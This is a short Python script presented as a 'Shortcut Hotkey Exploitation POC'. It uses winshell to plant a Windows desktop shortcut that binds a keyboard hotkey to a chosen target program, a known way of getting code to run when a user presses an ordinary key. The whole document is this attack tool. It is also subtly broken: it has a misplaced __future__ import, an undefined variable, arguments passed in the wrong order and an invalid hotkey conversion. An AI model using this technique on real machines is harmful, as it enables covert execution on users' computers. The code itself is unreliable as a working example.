# Written by Ido Veltzman
#
# Imports
from sys import version_info
from os import makedirs
from os.path import join, isfile, isdir
import winshell

# Fixing the program so it will work for both python 2 and python 3.
if version_info.major == 2:
    from __future__ import print_function
    input = raw_input

# Constants
HOTKEY = 90


def create_shortcut(shortcut_name, target, arguments=None, shortcut_path=None, description=None, hotkey=HOTKEY):
    """
    Creating shortcut with given parameters.
    :param shortcut_name: Shortcut's name.
    :param target: Shortcut's target file.
    :param arguments: Arguments for the target file.
    :param shortcut_path: Where the shortcut will be created. Default is on the desktop.
    :param description: Shortcut description. Default is nothing.
    :param hotkey: Assign a key to the shortcut file. Default is the constant HOTKEY (defined above).
    """
    # Checking if the path exists and if not creating it. If there's no path choosing default.
    if shortcut_path:

        # Validation check.
        if isdir(shortcut_path):
            shortcut = winshell.shortcut(join(shortcut_path, shortcut_name))
        else:
            print("[!] It appears that the directory {} not exists!".format(shortcut_path))
            print("[+] Creating {}".format(shortcut_path))
            makedirs(shortcut_path)
            shortcut = winshell.shortcut(join(shortcut_path, shortcut_name))
    else:
        shortcut = winshell.shortcut(join(winshell.desktop(), shortcutname))

    # Validation check and setting up target file.
    if isfile(target):
        shortcut.path = target
    else:
        print("[!] The file {} doesn't exists. Please run again this program with valid file.".format(target))
        return

    # Appending description if exists.
    if description:
        shortcut.description = description

    # Adding arguments if exists.
    if arguments:
        shortcut.arguments = arguments

    # Assigning hotkey.
    shortcut.hotkey = ord(hotkey.upper())

    # Creating the shortcut.
    shortcut.write() 


def main():
    print("Shortcut Hotkey Exploitation POC\nPress enter to apply default option.\n")
    shortcut_name = input("[*] Enter shortcut name\n> ")
    shortcut_target = input("\n[*] Enter target file path\n> ")
    shortcut_target = input("\n[*] Enter target file arguments (Default is nothing)\n> ")
    shortcut_path = input("\n[*] Enter shortcut path (Default is your desktop)\n> ")
    shortcut_desc = input("\n[*] Enter shortcut description (Default is nothing)\n> ")
    shortcut_hotkey = input("\n[*] Enter shortcut hotkey[letter] (Default in this program is: {})\n> ".format(ord(HOTKEY)))

    # Creating shortcut.
    create_shortcut(shortcut_name, shortcut_target, shortcut_path, shortcut_desc, shortcut_hotkey)
    print("\n[+] Shortcut successfuly created.")


if __name__ == "__main__":
    main()
